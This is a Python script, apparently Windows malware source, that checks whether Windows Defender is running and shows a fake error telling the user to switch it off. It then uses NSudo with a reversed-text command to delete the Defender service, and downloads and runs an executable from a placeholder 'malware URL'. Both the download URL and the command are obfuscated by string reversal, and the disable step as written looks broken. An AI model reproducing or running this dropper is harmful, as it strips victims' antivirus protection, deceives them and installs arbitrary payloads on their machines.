import ctypes
import os
import subprocess
import sys
import psutil
import requests
import time

class DefeatDefender:
    def __init__(self):
        self.url = "exe.oduSN/niam/noitcetorP-repmaT-ssapyB/anrakgaws/moc.tnetnocresubuhtig.war//:sptth"[::-1]
        self.dll_handle = ctypes.WinDLL("User32.dll")
        self.k_handle = ctypes.WinDLL("Kernel32.dll")
        self.is_running = False

    def check_error(self):
        error = self.k_handle.GetLastError()
        if error != 0:
            print("Error Code: {0}".format(error))
            sys.exit(1)

    def show_message_box(self):
        hwnd = None
        caption = 'Error Occurred'
        text = 'Windows Defender has blocked some of our features. Please turn off Windows Defender and run again'
        u_type = 0x00000010
        response = self.dll_handle.MessageBoxW(hwnd, text, caption, u_type)
        return response

    def check_defender_service(self):
        try:
            time.sleep(2.5)
            service = psutil.win_service_get('WdNisSvc')
            service = service.as_dict()
            if service['status'] == 'running':
                print("Please turn off Windows Defender.")
                self.is_running = True
        except Exception as ex:
            print(str(ex))

    def disable_defender(self):
        uname = os.getlogin()
        path = f"C:\\Users\\{uname}\\AppData\\Local\\Temp"
        os.chdir(path)

        nsudo_path = os.path.join(path, "Nsudo.exe")

        if not os.path.exists(nsudo_path):
            print("Nsudo.exe not found.")
            sys.exit(0)

        print(nsudo_path)

        malix_command = "echo dnefedniw  eteled cs  ediH:edoMwodniWwohS- T:U- odusN | cmd"
        subprocess.Popen(malix_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        time.sleep(3.2)
        
        malware_filename = "yourfilename.exe"  # Replace with your desired malware filename
        malware_url = "https://your-url-here/"  # Replace with your malware URL
        print(malware_url)
        
        malware = requests.get(malware_url, allow_redirects=True)
        open(malware_filename, 'wb').write(malware.content)
        
        subprocess.Popen(malware_filename, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                         stdin=subprocess.PIPE)

if __name__ == "__main__":
    ddf = DefeatDefender()
    ddf.check_defender_service()

    if ddf.is_running:
        while True:
            response = ddf.show_message_box()
            if response == 1:
                print("Clicked OK!")
            sys.exit(0)
            break
    else:
        print("Defender is already turned off.")
        ddf.disable_defender()
